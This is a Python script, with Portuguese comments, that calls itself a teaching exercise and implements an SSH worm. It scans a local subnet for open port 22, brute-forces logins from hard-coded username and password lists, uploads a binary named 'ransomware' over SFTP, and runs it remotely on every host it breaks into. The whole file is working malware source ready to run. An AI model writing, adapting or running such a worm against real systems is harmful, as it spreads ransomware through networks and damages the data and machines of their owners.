import socket
import paramiko
import os
import sys

# Configurações do ambiente didático
USUARIOS_ALVO = ["aluno", "admin", "root"]
SENHAS_ALVO = ["senha123", "password", "admin123"]
PORTA_SSH = 22

def get_resource(relative_path):
    """Obtém o caminho para o recurso, compatível com PyInstaller."""
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)

def scan_rede(prefixo_rede="192.168.1."):
    """Varre a rede em busca da porta 22 aberta."""
    alvos = []
    for i in range(1, 30):
        ip = f"{prefixo_rede}{i}"
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.1)
            if s.connect_ex((ip, PORTA_SSH)) == 0:
                alvos.append(ip)
    return alvos

def infectar_host(ip, usuario, senha):
    """Envia o binário, descompacta dependências e executa."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(ip, port=PORTA_SSH, username=usuario, password=senha, timeout=5)
        #print(f"[!] Sucesso em {ip}! Enviando pacotes...")

        sftp = client.open_sftp()
        # 1. Envia o executável compilado (nomeado como 'ransomware')
        sftp.put(("ransomware"), "ransomware")
        sftp.close()

        # 2. Comandos remotos:
        cmd_chmod = "chmod +x ransomware"
        cmd_run = "./ransomware"
        
        #print(f"[*] A iniciar execução remota em {ip}...")
        client.exec_command(f"{cmd_chmod} && {cmd_run}")
        client.close()
        return True
    except Exception as e:
        print(f"[-] Falha em {ip}: {e}")
        return False

def iniciar_worm():
    hosts = scan_rede()
    for host in hosts:
        for user in USUARIOS_ALVO:
            sucesso = False
            for pwd in SENHAS_ALVO:
                if infectar_host(host, user, pwd):
                    sucesso = True
                    break
            if sucesso: break

if __name__ == "__main__":
    iniciar_worm()